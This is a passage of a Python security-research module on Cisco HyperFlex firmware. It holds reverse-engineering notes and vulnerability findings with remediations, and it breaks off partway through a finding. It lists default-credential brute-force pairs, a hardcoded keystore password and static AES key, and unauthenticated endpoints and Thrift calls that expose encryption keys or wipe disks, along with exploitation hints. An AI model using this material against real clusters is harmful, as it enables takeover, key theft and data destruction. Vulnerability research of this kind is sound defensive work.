"""
Cisco HyperFlex (HX Data Platform) — RE Module
Firmware corpus: HX-ESXi-7.0U1 through HX-ESXi-8.0U3 (install ISOs + upgrade bundles)
Architecture: Cisco-customized ESXi + stCtlVM (storage controller VM, Debian/Linux)

HyperFlex stack:
  ESXi host:   Cisco custom VIBs (hxdp-*, hx-*, springpath-*) — kernel drivers + agents
  stCtlVM:     Debian Linux VM — HX Data Platform storage stack (C++/Python/Go binaries)
               ports: 443 (HX Connect REST API), 8080 (internal), 9090 (Prometheus), 3260 (iSCSI)
  HX Connect:  HTTPS REST API — cluster management, node enrollment, Intersight claim
  UCSM:        UCS Manager XML API integration (port 443 on UCSM)
  vCenter:     Plugin integration (remote plugin OVA: HTML5-remote-plugin-Appliance-3.0.0-1173.ova)

Extraction method:
  ISO (iso9660) -> VIBs at /packages/*.vib -> .tgz -> payloads
  Upgrade bundles (.zip) -> VIBs directly
  stCtlVM: embedded as OVA or installer package inside VIBs

Default credentials (HX Connect REST API):
  POST /rest/v1/tokens {username, password} -> hx-auth-token
  Brute: admin/admin, admin/C1sco12345, admin/Cisco123, admin/HXpassword1!,
         hxadmin/C1sco12345, admin/Password1!, root/password1!, root/Cisco123,
         root/springpath, spadmin/springpath (IPMI: HX-F028)

Unauthenticated endpoints (HX Connect <4.5):
  GET /rest/v1/cluster  — cluster UUID, version, node count
  GET /rest/v1/version  — HXDP version string
  GET /rest/v1/about    — platform info

High-value authenticated endpoints:
  GET /rest/v1/nodes                        — node IPs, serial numbers, roles
  GET /rest/v1/intersight/connection        — Intersight claim code (device takeover pivot)
  GET /rest/v1/clusters/local/snapshots     — snapshot inventory
  GET /rest/v1/storage/disks               — disk topology + SN
  GET /rest/v1/cluster/security            — security config

Firmware corpus:
  storfs-packages-6.0.2b-44423.tgz — HXDP core packages (848MB)
  Cisco-HX-Data-Platform-Installer-v6.0.2b-44423-esx.ova — installer appliance (Ubuntu 64-bit, 24.8GB vdisk)
  cisco-hxdc_6.0.2b-44423_amd64.deb — Intersight Device Connector + image signing verifier
  cisco-openssl_1.1.1za_amd64.deb — private EOL OpenSSL fork + CiscoSSH replacement
  hx-iscsi_6.0.2b-44423_amd64.deb — iSCSI service (16MB ELF, not stripped)
  hx-os_6.0.2b-44423_amd64.deb — OS configs (auditd, iptables, syslog-ng)
  zookeeper_3.8.1_amd64.deb — distributed coordinator
  storfs-support-workflows-6.0.2b-44423.tgz — support debs + bootstrap workflow
  hxdp-connector bundle (inner): Go binary (UPX-packed, 25MB unpacked), version 1.0.11-20250305

Key services (from syslog-ng):
  storfs, iscsisvc, scvmclient, hxmanager, cip-monitor, replsvc, smbscvmclient, stmapper, networkMonitor
  hxmanager logs sent over TCP to syslog-ng localhost:514

Port topology (iptables_node_reset.rules):
  8092 — Springpath internal cluster bus (OUTPUT restricted to springpath/www-data)
  2003 — Graphite metrics (OUTPUT restricted to www-data)
  3260 — iSCSI (inbound from ESXi initiators)

Image signing (hxdc_release_img_verify, 32-bit ELF, not stripped):
  Cisco ROMMON code-sign library (cs_rommon_* functions — shared with IOS/NX-OS boot signing)
  RSA PKCS#1 + SHA-512; custom BigNum (RsaLibBigNum*), NOT OpenSSL
  Key storage: /opt/partner/cisco-hxdc/public-key (Cisco TLV format, multi-version with revocation)
  Bundle format: [gzip tar][440-byte Cisco RSA-3072 PKCS#1 signature]
  Dev keys: cs_rommon_platform_allow_dev_keys(0) called from main() — disabled in production

Auto-upgrade NFS path:
  Primary pushes bundle to /nfs/SYSTEM/hx_device_connector/bundle_data/hxdc_active_bundle
  Secondary nodes pull from NFS at startup; no NFS write-protection enforced in code

iscsisvc architecture (16MB PIE ELF, not stripped, statically compiled OpenSSL):
  Build path: /opt/git/cypress/opensrc/istgt/src/chap_util.c  (Cisco internal project "cypress")
  IoVisor: ESXi-side kernel driver (stHypervisorSvc VIB); iscsisvc manages IoVisor registrations
  Iscsi_RegisterIoVisor / Iscsi_GetRedirectionInfo / Iscsi_Redirect — connection redirect/LB
  Binary protections:
    PIE: YES (ELF Type DYN, FLAGS_1=PIE)
    ASLR: YES (PIE binary)
    Stack canaries: YES (__stack_chk_fail called extensively in all handlers)
    NX/DEP: YES (GNU_STACK RW, not executable)
    RELRO: PARTIAL (GNU_RELRO present, no BIND_NOW -> GOT remains writable post-load)
    Note: partial RELRO = GOT overwrite remains viable exploitation primitive if heap write-primitive found
  conn_worker_ev_pdu_exec (0x282130) — iSCSI PDU execution handler
    Stack frame: 264 bytes (sub rsp,0x108); opcode read at [rsi], masked to 6-bit via 'and eax,0x3f'
    Sequence validation: bswap r13d; compare against connection struct at [rbx+0x128]+0xdc/0xe0
    Pre-filter: bt rax,0x16 gates opcodes 0x01/0x02/0x04 through CmdSN seq validation before dispatch
    Non-filtered opcodes (0x00,0x03,0x05,0x06,0x10) bypass seq validation, checked at cmp al,0x5 first
    Jump table (relative offset, 4B entries): 0xb0bc6c; valid range opcodes 0x00-0x10; >0x10 -> error
      0x00 NOP-Out       -> 0x2828b0 (conn_worker_ev_nop_send echo path via nop_send/CB/CB2)
      0x01 SCSI Command  -> 0x282da8 -> istgt_iscsi_op_scsi (0x2751e0)
      0x02 SCSI Task Mgmt-> 0x282be0
      0x03 Login Request -> 0x282b80 -> istgt_iscsi_op_login (0x27c7e0)
      0x04 Text Request  -> 0x282b20 -> istgt_iscsi_op_text (0x26d360)
      0x05 SCSI Data-Out -> 0x282e40 (also 0x2830e0 pre-seq-check path)
      0x06 Logout Request-> 0x282e10
      0x07-0x0f reserved -> 0x282610 (error handler)
      0x10 SNACK Request -> 0x2825c8
  istgt_iscsi_op_login (0x27c7e0) — RFC 3720 Login PDU handler
    Stack frame: 2248 bytes (sub rsp,0x8c8); parses T-bit, CSG/NSG, ISID, TSIH, CmdSN, ExpStatSN
  istgt_iscsi_parse_params (0x29b990) — Text/Login key=value PDU data parser
    Key buffer: xmalloc(0x41) = 65 bytes; enforces key_len <= 64 (cmp r15d,0x40; jg error)
    Value buffer: xmalloc(0x2001) = 8193 bytes; enforces val_len <= 8192 (cmp r15d,0x2000; jg error)
    Bounds checked BEFORE copy — text negotiation parser is SAFE
  istgt_iscsi_op_data (0x276d60) — SCSI Data-Out handler
    DataSegmentLength: 24-bit from PDU bytes [5:7] (max 0xFFFFFF = 16MB)
    Bounds check at 0x276f37: rcx = BufferOffset + DataSegmentLength; cmp rcx, EDTL; ja error
    memcpy at 0x276f77: dst=task_buf+offset, src=PDU_data_ptr, size=DataSegmentLength — SAFE
  chap_decrypt_init (0x28ba30) / chap_decrypt_cleanup — CHAP (MD5) authentication
  CHAP credential infrastructure:
    ZooKeeper path: /chap/<initiator-iqn>  JSON: {chapName: <base64-ciphertext>, chapSecret: <base64-ciphertext>}
    Decrypt path (decrypt_data, 0x28bcf0):
      1. get_keystore_passwd (0x28b7e0): reads <entry key="keystore_password"> from
         /etc/hyperflex/secure/hyperflex_security.properties (fgets line scan)
      2. d2i_PKCS12_fp("/etc/hyperflex/secure/hyperflex_keystore.p12"): loads PKCS#12
      3. PKCS12_parse: extracts RSA private key
      4. BIO base64-decode ciphertext, then RSA_private_decrypt(0x100, ct, pt, key, RSA_PKCS1_PADDING=1)
    Both keystore and password file in same directory: /etc/hyperflex/secure/
  _add_dm_targets — dm-device mapper target manipulation
  PEM_write_PKCS8PrivateKey / crypt_keyslot_add_by_volume_key — LUKS integration
  AkvStor DEK cache: AkvStor->kvDEKCache->kvDataEncryptionKeys[dekIndex].isSet — in-memory LUKS key cache
  Encryption library toggle: /opt/hyperflex/storfs-core/encrypt/libcrypt_disabled.so vs libcrypt_enabled.so

hxdp connector binary (Go, UPX-packed, stripped):
  Internal project names: apollo (connector codebase), starship (HXDP), diesel (build system)
  Build server: /mnt/vol1/jenkins/workspace/starship/master/diesel/code/apollo/
  Intersight cloud WebSocket endpoint: svc-static1.ucs-connect.com
  HashiCorp Vault API paths embedded: /pki/root/sign-self-issued, /sys/revoke-force/{prefix}
  SUDI certificate authentication to Intersight
  Emulator mode path: /.device_connector_emulator/intersight/catalog/Version
  Go pprof endpoint: /debug/pprof/, /debug/pprof/cmdline, /debug/pprof/profile
  Cloud domain override env vars: ENV_ANDROMEDA_DOMAIN_NAME, ENV_SERVICE_DOMAIN_NAME, ENV_WEB_ELB_DOMAIN_NAME
  Staging Intersight domains (hardcoded in binary): cntcicd.starshipcloud.com, staging.starshipcloud.com,
    cntperf.starshipcloud.com, sretest.starshipcloud.com, cntqa.starshipcloud.com
  adsecret cipher library: adsecret_cipher.CipherIntf / adsecret.CipherMsg / adsecret.DecryptReq (AES-GCM)
  JWT: ECDSA (jwt/ecdsa.go source path embedded); stSSOMgr SSO service at localhost:9334
  Cert paths: certs/cisco-root-ca.pem; config: /etc/springpath/visorhost, /etc/springpath/stMgr.cfg
  Certificate: -----END+CERTIFICATE----- non-standard PEM footer variant present

Installer appliance filesystem (Cisco-HX-Data-Platform-Installer-v6.0.2b-44423-esx.ova, 24.2GB vdisk):
  Build: BUILD_ID=44423, BUILD_DATE=20251107, BUILD_TYPE=release, BUILD_RELEASE=6.0.2b
  /etc/hyperflex/secure/ (world-traversable, drwxr-xr-x):
    hyperflex_keystore.jceks  (rw-r--r--, 2700 bytes; Java JCEKS magic 0xCECECECE)
      Entry 1: aes_encryption (SecretKeyEntry — AES key for data-at-rest)
      Entry 2: vcenter_client (PrivateKeyEntry; CN=*.cisco.com, OU=Engineering; self-signed; valid until 2055; SHA512withRSA)
    hyperflex_security.properties -> /usr/share/hyperflex/storfs-misc/hyperflex_security.properties
      Content: <entry key="keystore_password">c3ByaW5ncGF0aA==</entry>  (base64 -> "springpath")
  nginx: conf.d + ngx_cisco_fips_module.so; server.key NOT pre-provisioned in installer (generated during deploy)
  /opt/hyperflex/auth/auth — ELF 64-bit, dynamically linked, NOT stripped (symbols available)
  auth.service: WorkingDirectory=/opt/hyperflex/auth; binds localhost:9334 (stSSOMgr)
  deployNodes.py: reads credentials.installer_passwd via parseEnvVariableTunes()
  stssoclient.py: thrift client to stSSOMgr on localhost:9334

iscsisvc SCSI path analysis:
  conn_worker_ev_nop_send (0x285f10): builds fixed NOP-In response (TTT=0xFFFFFFFF, opcode=0x20, F-bit)
    via istgt_iscsi_send_response — no echo of NOP-Out DataSegment data; SAFE
  istgt_iscsi_op_scsi (0x2751e0) EDTL handling (candidate — needs exploitation confirmation):
    EDTL = bswap([r15+0x14]) -> [rsp+0x20]
    Buffer adequacy check: lea eax,[rax+rsi*1+0x11000] at 0x2755b4 where rsi=EDTL (32-bit LEA)
    Overflow: EDTL=0xFFFFFFFF causes LEA to wrap -> cmp [r14+0x2e8],0x10FF passes for most pre-allocs
    On overflow: code proceeds with undersized buffer instead of triggering jl->0x276513 error path
    0x276513 error path: Log_UserAlert + return -1 (no dynamic realloc — fixed allocation only)
    Exploitation impact: depends on whether EDTL drives subsequent memory write (vs SCSI CDB xfer len)

auth binary (hx-auth, 9.5MB ELF, not stripped, /opt/hyperflex/auth/auth):
  Uses dgrijalva/jwt-go v4.0.0-preview1 (archived 2021-01, CVE-2020-26160 audience bypass)
  Binary contains: *jwt.signingMethodNone, *jwt.unsafeNoneMagicConstant — alg:none path compiled in
  JWT key (main.TokenSigningKey) in .bss, runtime-initialized — not hardcoded
  Service: stSSOMgr on localhost:9334, Gorilla mux v1.7.1, PAM integration via CGo

installerrestapi-1.0.0.war (60MB Java WAR, installer appliance):
  web.xml comment: "Disable AAA Authentication for installer rest api"
  SPBasicAuth (SSOBasicAuthImpl) + SPAuth (SSOAuthFilterImpl) filters commented out
  No <security-constraint> elements — entire /rest/* surface unauthenticated
  Endpoints: /rest/*, /upload, /internalsupport/*, /st-support/*, /storfs-support/*
  REST resources: BootstrapResource, DeploymentResource, VirtPlatformResource
  BootstrapResource: createCluster, expandCluster, shutdownCluster, deployNodes, executeCommand,
                     runCommand, validateVcenterCredentials, getVcServerDetails, pings, getNodes
  DeploymentResource: getResponseFromHxdpRest(HxCredDetails, url), deployNodes, createCluster,
                      configInstaller, updateCatalog, checkDeployNodes
  Executor.executeCommand: prefix allowlist = {stcli, sysmtool, mkfs.storfs}; Runtime.exec(String[])
  pings(): Runtime.exec("timeout 1 ping -c 1 " + userInput) — BootstrapMethods #1 template confirmed
           Runtime.exec(String) tokenizes by whitespace; no shell invocation; argument injection only
  StorvisorFileUploader: /upload endpoint, multipart POST to /var/www/localhost/images/ (no auth)
  WebDownloader.trustAllHttpsCertificates(): TrustAllManager + always-valid HostnameVerifier installed
    globally via HttpsURLConnection.setDefaultSSLSocketFactory() — affects full installer JVM TLS stack
  SecurityConfigurationManager (singleton Enum): reads keystore_password from
    /etc/hyperflex/secure/hyperflex_security.properties -> Base64.getDecoder().decode() -> "springpath"
  HostCredentialsAccess(): connects to localhost Thrift + reads /etc/hyperflex/secure/root_file.pub
    .getUserName() / .getPassword() return EsxCredential.username / .password (ESXi host credentials)

ZooKeeper auth (zkClient.py / storfs-support/listzkdb.py):
  ZKClient.__enter__ auth token = "postEvent;" + cluster_uuid
  cluster_uuid source: /etc/hyperflex/clusteruuid
  ZK UUID auth scheme bypassed by GET /rest/v1/cluster (unauthenticated) -> cluster UUID field
  listzkdb.py uses paramiko.AutoAddPolicy() (SSH TOFU, no host key verification)
  Credentials logged in exception output: "Paramiko ssh connect exception: %s, host: %s user: %s password: %s"

vcCertificateUtilities.py:
  SpringpathVMWare.getServiceInstance_VCenter_SDK_Via_Certificate() -> uses vcenter_client RSA key from JCEKS (HX-F13)
  Confirms HX-F13 vCenter client cert is the live auth credential for vCenter management operations

Findings: HX-F01 (HIGH) through HX-F29 (HIGH).

storfs-restapi_6.0.2b-44423_amd64.deb (81MB) — 11 WARs on stCtlVM:
  auth, coreapi, securityservice, encryption, dataprotection, backupservice,
  hxupgrade, supportservice, iscsi, slservice, ROOT
  auth-1.0.0.war: ALL auth filters enabled (contrast: installer WAR HX-F001 disables them)
    web.xml filters: AuditFilter, SPPrivilegedAuth (SSOPrivilegeAuthImpl),
      SessionAuth (SessionCookieFilterImpl), KerberosAuth (KerberosFilterImpl),
      ServiceAccessAuth (ServiceAccessAuthFilterImpl), SPBasicAuth (SSOBasicAuthImpl),
      SPAuth (SSOAuthFilterImpl) — all mapped to /v1/*
  authfilter-1.0.0.jar (from dependencies.zip) implements filter classes:
    SSOPrivilegeAuthImpl: X-RootSessionID == /etc/hyperflex/secure/root_file.pub
      -> accepts X-LoggedInUser/X-Scope/X-RequestInitiator as identity (HX-F29)
    ServiceAccessAuthFilterImpl: short-circuits if Authenticated=True set upstream
    SSOBasicAuthImpl: standard Basic Auth validation path
    KerberosFilterImpl: Kerberos ticket path (Hyper-V hypervisor only)
    SessionCookieFilterImpl: session cookie path (ESXi hypervisor only)
  HxSecurity.getLocalSessionId(): reads /etc/hyperflex/secure/root_file.pub via FileInputStream
  AuthorizedApiServiceImpl.authorizedRequest() dispatch order:
    1. Authorization: Basic -> SSOManager.validateAuthHeaderForBasicToken()
    2. Authorization: Bearer -> SSOManager.validateAccessTokenConvertToJWT()
    3. No Authorization header -> SSOPrivilegeAuthImpl (X-RootSessionID check)
    4. If ESX: SessionCookieFilterImpl
    5. If HyperV: KerberosFilterImpl
    6. Fallback: SSOBasicAuthImpl

springpath_env_parse.py tunes credential encryption:
  AES-128-CBC; key = md5(Secret.class) as hex string = "1f6d13bcd7753f2d3b2e2da361b7afb5"
  Secret.class path: /usr/share/hyperflex/storfs-misc/Secret.class (firmware-embedded static file)
  Encrypted values stored in INI-format .tunes files:
    /opt/hyperflex/springpath_default.tunes (cluster-wide defaults)
    /opt/hyperflex/springpath_custom_cluster.tunes (cluster overrides)
    /opt/hyperflex/springpath_custom_node.tunes (per-node overrides)
  installer_passwd key: credentials.installer_passwd (read by deployNodes.py at startup)
  AES key is static across all deployments of same firmware version — any extract of firmware
  yields the key; no per-deployment key derivation.

stSSOMgr (auth binary at /opt/hyperflex/auth/auth, 9.5MB):
  Binds localhost:9334, TBinaryProtocol/TFramedTransport Thrift server (no auth)
  Interface: StSSOMgr.Client.getHypervHostCreds() -> JSON string:
    {"host": {"localadminusername": "<hyperv_admin>", "localadminusercred": "<base64_password>"}}
  Credential source: ZooKeeper (fetched and cached by auth service)
  Client (stssoclient.py): no authentication on Thrift connect; returns username + base64-decoded password

hxinstaller (Go binary, /opt/hyperflex/hxinstaller/installer, 15MB, debug info, not stripped):
  Source tree: bitbucket-eng-chn-sjc1.cisco.com/HXDP/installer-v2/server/
  Source files: create_validate.go, deploy_validate.go, hypervBareMetal.go, hyperv.go,
                hypervisor.go, validate.go, validate_hyperv.go, validate_login.go,
                validate_serversIP.go, validate_ucsm.go, validate_vcenter.go
  SQLite embedded (github.com/mattn/go-sqlite3 + CGo); DB path: installer.db
  REST endpoints (gorilla mux, runtime-registered):
    /api/validate_login, /api/upload_catalog, /api/update_catalog, /api/bundle_details
    /api/validate_hyperv, /api/configInstaller, /api/catalog_version, /api/upload_catalog_version
    /api/configure_server_ports, /api/servers/{serial}/disassociate, /api/resolve_mgmthostname
    /api/restart, /api/servers, /api/config, /api/fields, /api/upload, /api/about
    /api/proxy, /api/reset, /api/tech_support/poll, /disassoc_hv-installer
    /rest/deployment/proxy?url=<target>  (explicit SSRF proxy)
    /rest/deployment/upgradeClusterJobUCSM, /rest/deployment/updateCatalog
    /rest/deployment/checkDeployNodesJob, /rest/validate/fqdn, /rest/validate/mgmthostname
  Accepts: hxAdminPassword, vCenterPassword, esxPassword, cimcPassword fields in request bodies
  Command execution: os/exec.Cmd — "Executing command :%s" log prefix
    genisoimage via /usr/bin/genisoimagemanagement: builds hypervisorConfigData.iso
    runOSInstallAndHypervConfig: OS install + Hyper-V network config execution path
"""

import socket
import ssl
import json
import urllib.request
import urllib.error
import urllib.parse
import os
import subprocess
from typing import Optional


# ─── Default Credentials ─────────────────────────────────────────────────────

# Keystore password — static across all deployments (base64 in hyperflex_security.properties)
HX_KEYSTORE_PASSWORD = "springpath"
HX_KEYSTORE_JCEKS    = "/etc/hyperflex/secure/hyperflex_keystore.jceks"
HX_KEYSTORE_P12      = "/etc/hyperflex/secure/hyperflex_keystore.p12"
HX_KEYSTORE_PROPS    = "/etc/hyperflex/secure/hyperflex_security.properties"

HX_DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "C1sco12345"),
    ("admin", "Cisco123"),
    ("admin", "cisco"),
    ("admin", "HXpassword1!"),
    ("hxadmin", "C1sco12345"),
    ("admin", "Password1!"),
    ("root", "password1!"),
    ("root", "Cisco123"),
]

HX_CONNECT_PORT = 443
HX_UNAUTH_PATHS = [
    "/rest/v1/cluster",
    "/rest/v1/version",
    "/rest/v1/about",
]

HX_AUTH_PATHS = {
    "nodes":            "/rest/v1/nodes",
    "datastores":       "/rest/v1/datastores",
    "alarms":           "/rest/v1/alarms",
    "snapshots":        "/rest/v1/clusters/local/snapshots",
    "disks":            "/rest/v1/storage/disks",
    "volumes":          "/rest/v1/volumes",
    "intersight_conn":  "/rest/v1/intersight/connection",
    "network":          "/rest/v1/network",
    "security":         "/rest/v1/cluster/security",
}

ISCSI_PORT = 3260
NFS_PORT   = 2049

UCSM_CREDS = [
    ("admin", "admin"),
    ("admin", "cisco"),
    ("admin", "C1sco12345"),
    ("admin", "password"),
]


# ─── Findings ────────────────────────────────────────────────────────────────

FINDINGS = {
    "HX-F001": {
        "title": "Installer REST API Entirely Unauthenticated — All Cluster Operations Exposed",
        "severity": "CRITICAL",
        "component": "installerrestapi-1.0.0.war (WEB-INF/web.xml)",
        "description": (
            "The HyperFlex installer appliance REST API at /rest/* has authentication "
            "intentionally disabled. web.xml contains the comment "
            "'Disable AAA Authentication for installer rest api' wrapping the entire "
            "authentication filter block (SPBasicAuth and SPAuth). No <security-constraint> "
            "elements are present. All REST endpoints — including cluster creation, expansion, "
            "and shutdown; stcli command execution; vCenter credential validation; ESXi credential "
            "retrieval; file upload; and HXDP REST proxying — are accessible to any host on "
            "the management network without credentials. Applies to: "
            "/rest/*, /upload, /internalsupport/*, /st-support/*, /storfs-support/*."
        ),
        "code_evidence": {
            "web_xml_comment": "Disable AAA Authentication for installer rest api",
            "commented_out_filters": [
                "SPBasicAuth -> com.springpath.hx.aaa.filters.basicAuthFilter.SSOBasicAuthImpl",
                "SPAuth -> com.springpath.hx.aaa.filters.ssoFilter.SSOAuthFilterImpl",
            ],
            "commented_out_filter_mappings": ["SPBasicAuth -> /rest/*", "SPAuth -> /rest/*"],
            "unauthenticated_operations": [
                "BootstrapResource: createCluster, expandCluster, shutdownCluster, deployNodes",
                "BootstrapResource: executeCommand (stcli/sysmtool/mkfs.storfs allowlist)",
                "BootstrapResource: validateVcenterCredentials, getVcServerDetails",
                "BootstrapResource: pings (internal host enumeration)",
                "DeploymentResource: getResponseFromHxdpRest (SSRF proxy to HXDP REST)",
                "DeploymentResource: configInstaller, updateCatalog, deployNodesJob",
                "StorvisorFileUploader: /upload (file write to /var/www/localhost/images/)",
                "VirtPlatformResource: getVirtualMachines, getEvents, powerOnOffVM",
            ],
        },
        "versions_affected": ["6.0.2b-44423 (installer appliance)"],
        "remediation": (
            "Re-enable the SPBasicAuth and SPAuth servlet filters in web.xml. "
            "At minimum, gate all write-capable endpoints (createCluster, deployNodes, upload) "
            "behind authentication. The installer appliance should not be network-accessible "
            "outside of the dedicated HyperFlex management VLAN."
        ),
    },











    "HX-F002": {
        "title": (
            "Unauthenticated DARE Key Thrift RPCs in storfs — "
            "Encryption Key Exfiltration and Replacement (CWE-306)"
        ),
        "severity": "CRITICAL",
        "component": (
            "storfs (storfs-core package, ELF 64-bit, ~20MB, not stripped). "
            "Class: com::storvisor::sysmgmt::StPlatformEncProcessor. "
            "Thread: sysmgmtNonBlockingEncThreadId (dedicated enc Thrift server thread)."
        ),
        "description": (
            "The storfs binary hosts a dedicated Apache Thrift server "
            "(stNonBlockingEncServer, TNonblockingServer) that exposes the StPlatformEnc service. "
            "The process_getDataEncryptionKeys handler parses the incoming Thrift request, "
            "calls readMessageEnd(), then immediately invokes the handler "
            "StPlatformEncDispatcher::getDataEncryptionKeys without any authentication check. "
            "The args struct StPlatformEnc_getDataEncryptionKeys_args contains no credential fields. "
            "A successful call returns an HxEncryptionData object containing all Data Encryption Keys "
            "(DEKs) for the cluster, which directly defeats the Data At Rest Encryption (DARE) feature. "
            "The dispatchCall implementation is pure string-comparison method routing with no "
            "Thrift-layer auth header validation. The server is started unconditionally by "
            "SysMgmt_InitInternal alongside the main sysmgmt Thrift server."
        ),
        "code_evidence": {
            "binary": "storfs (ELF 64-bit, not stripped, ~20MB)",
            "handler_fn": "StPlatformEncProcessor::process_getDataEncryptionKeys @ 0x9ade70",
            "dispatcher_fn": "StPlatformEncDispatcher::getDataEncryptionKeys @ 0xa2b9e0",
            "args_read_fn": "StPlatformEnc_getDataEncryptionKeys_args::read @ 0x9a7510",
            "args_struct": "StPlatformEnc_getDataEncryptionKeys_args (no auth fields in struct)",
            "return_type": "HxEncryptionData (vtable _ZTVN...16HxEncryptionDataE @ 0x10b7ba0)",
            "server_global": "stNonBlockingEncServer @ BSS:0x1bd0970",
            "server_start_fn": "StartNonBlockingEncServer @ 0x8c2910",
            "server_thread": "_ZL29sysmgmtNonBlockingEncThreadId (created by SysMgmt_InitInternal @ 0x8c1dc0)",
            "dispatch_fn": "StPlatformEncProcessor::dispatchCall @ 0x9af4f0 — string-match dispatch, no auth",
            "kv_key_fn": "KVGetDataEncryptionKey @ 0x61a8d0 (lower-level ZK/KV key retrieval)",
            "auth_check": "NONE — no authentication before handler dispatch confirmed in disasm",
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Bind stNonBlockingEncServer to 127.0.0.1 only. "
            "Add a caller-identity verification step at the Thrift dispatch layer "
            "(TLS mutual auth or a pre-dispatch token check). "
            "If the StPlatformEnc service must remain a Thrift interface, require a session token "
            "verified against the hx-auth service before returning DEK material. "
            "Consider replacing the Thrift enc interface with a Unix-domain socket accessible "
            "only to root-owned processes."
        ),
    },
    "HX-F003": {
        "title": "Unauthenticated StPlatform Thrift Interface — 80+ Cluster Management Operations Exposed",
        "severity": "CRITICAL",
        "component": (
            "storfs (storfs-core package, ELF 64-bit, ~20MB, not stripped). "
            "Class: com::storvisor::sysmgmt::StPlatformProcessor. "
            "Server: sysmgmtNonBlockingServer (TNonblockingServer, started by SysMgmt_InitInternal). "
            "Service IDL: com.storvisor.sysmgmt.StPlatform."
        ),
        "description": (
            "The main StPlatform Apache Thrift service in storfs exposes 80+ cluster management "
            "methods without any Thrift-layer authentication. The dispatchCall implementation "
            "(StPlatformProcessor::dispatchCall) routes exclusively by method name string comparison "
            "with no preceding token or credential check. Confirmed by disassembly of "
            "process_formatDisks @ 0x9947d0: RTTI type check, args parse, readMessageEnd, "
            "handler call, no auth. "
            "Any caller that can reach the Thrift server port can invoke any of these operations. "
            "The most destructive accessible methods include: formatDisks, shutdownCluster, "
            "deleteDatastore, deleteDatastoreSnapshots, removeNode, removeDisk, clusterUpgrade, "
            "enableZKAuth, resetZkConnectionString, setPlatformClusterAccessPolicy, "
            "setPlatformMaintenanceMode, blacklistDisks, retireDisks, unclaimDisks, "
            "revertDatastoreSnapshot, teardownNRNFS, setDataWriteThru."
        ),
        "code_evidence": {
            "binary": "storfs (ELF 64-bit, not stripped, ~20MB)",
            "confirmed_handler": "process_formatDisks @ 0x9947d0 (same auth-less pattern as HX-F002)",
            "dispatch_fn": "StPlatformProcessor::dispatchCall — string-match routing, no auth gate",
            "server_start_fn": "StartNonBlockingServer @ 0x8c27e0",
            "server_thread": "_ZL26sysmgmtNonBlockingThreadId (created by SysMgmt_InitInternal @ 0x8c1dc0)",
            "total_methods": "80+ process_* handlers in StPlatformProcessor",
            "destructive_methods": [
                "formatDisks — format all drives, destroys all data",
                "shutdownCluster — immediate cluster shutdown (DoS)",
                "deleteDatastore / deleteDatastoreSnapshots — datastore destruction",
                "deleteFiles — arbitrary file deletion",
                "removeNode / removeDisk — cluster topology modification",
                "clusterUpgrade — trigger upgrade with attacker-controlled version map",
                "enableZKAuth / resetZkConnectionString — ZooKeeper state manipulation",
                "setPlatformClusterAccessPolicy — modify cluster access policies",
                "setPlatformMaintenanceMode — partial DoS via forced maintenance",
                "blacklistDisks / retireDisks / unclaimDisks — disk eviction",
                "revertDatastoreSnapshot — rollback data to arbitrary snapshot",
                "teardownNRNFS — tear down NFS replication",
                "setDataWriteThru — toggle write-through caching",
            ],
            "read_only_methods_also_exposed": [
                "getCluster, getNodes, getDisks, getDatastores — topology enumeration",
                "getClusterStats, getCleanerStats, getEnospaceInfo — metrics leak",
                "getAboutInfo — version/build disclosure",
            ],
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Bind the StPlatform Thrift server to 127.0.0.1 only. "
            "Add pre-dispatch authentication at the TNonblockingServer level using a shared secret "
            "or mutual TLS. For write-path methods (formatDisks, deleteDatastore, etc.), require "
            "a session token from hx-auth before the handler is invoked. "
            "For cluster-level destructive operations (formatDisks, shutdownCluster, removeNode), "
            "require explicit operator confirmation via a separate signed request channel."
        ),
    },
    "HX-F004": {
        "title": "Unauthenticated Key Encryption Key (KEK) HTTP Endpoint on Port 35333",
        "severity": "CRITICAL",
        "component": (
            "hxdp-connector (Go 1.23.4 binary, UPX-packed, 25MB unpacked, stripped .symtab). "
            "Module: github-hyc.scm.engit.cisco.com/starship/diesel/encryption. "
            "Source: diesel/code/diesel/encryption/encryption_handler.go. "
            "Struct: (*EncryptionClient). Handler registered by StartEncryptionHandler on HTTP mux."
        ),
        "description": (
            "The hxdp-connector binary listens on port 35333 and serves a Key Encryption Key (KEK) "
            "retrieval endpoint via the getKeyEncryptionKeyHandler method. The registered HTTP handler "
            "closure (getKeyEncryptionKeyHandler.func1, PC=0x9e9ec0) dispatches directly to an inner "
            "handler at 0x9e9f20 with no authentication check before executing KEK retrieval. "
            "The inner handler creates a KeyEncryptionKeyType struct (runtime.newobject), calls "
            "barcelona/adio/json.NewContextWithSkipCustom (0x8746a0) and json.UnmarshalWithCtx "
            "(0x874a20) to parse the request, then calls adcore.UnmarshalJsonToMo* (0x9884a0) to "
            "serialize and return the KEK. There is no Authorization header read, no JWT token "
            "validation, and no session check at any point in this dispatch chain. "
            "The baseHandler method (PC=0x9e9ca0) is a 10-instruction value-packing stub that "
            "immediately returns; it is not an auth middleware. "
            "The apollo/base.appHandler.HandleWithAuth function is present in the binary (JWT "
            "validation via jwt/v4 library) but is not wired to this handler. "
            "Any unauthenticated caller that can reach port 35333 can retrieve the cluster KEK."
        ),
        "code_evidence": {
            "binary": "hxdp-connector (UPX-unpacked, Go 1.23.4, stripped, 25.7MB)",
            "port": 35333,
            "handler_method": "(*EncryptionClient).getKeyEncryptionKeyHandler @ PC=0x9e9b40",
            "registered_closure": "getKeyEncryptionKeyHandler.func1 @ PC=0x9e9ec0",
            "inner_dispatch": "anonymous inner handler @ 0x9e9f20 (called from func1 with no auth check)",
            "call_sequence": [
                "0x9e9f50: runtime.newobject (allocate KeyEncryptionKeyType struct)",
                "0x9e9fa0: barcelona/adio/json.NewContextWithSkipCustom @ 0x8746a0 (request parse context)",
                "0x9e9fc0: barcelona/adio/json.UnmarshalWithCtx @ 0x874a20 (unmarshal request JSON)",
                "0x9e9ff5: barcelona/adcore.UnmarshalJsonToMo* @ 0x9884a0 (serialize KEK response)",
            ],
            "auth_check": "NONE — no Authorization header read, no JWT parse, no middleware gate",
            "baseHandler_confirmed_stub": (
                "baseHandler @ 0x9e9ca0: 10 instructions, saves 6 args to stack, "
                "packs rsi+r8 into rax+rbx, immediate ret — value-packing stub, not auth middleware"
            ),
            "HandleWithAuth_unused": (
                "apollo/base.appHandler.HandleWithAuth present in binary "
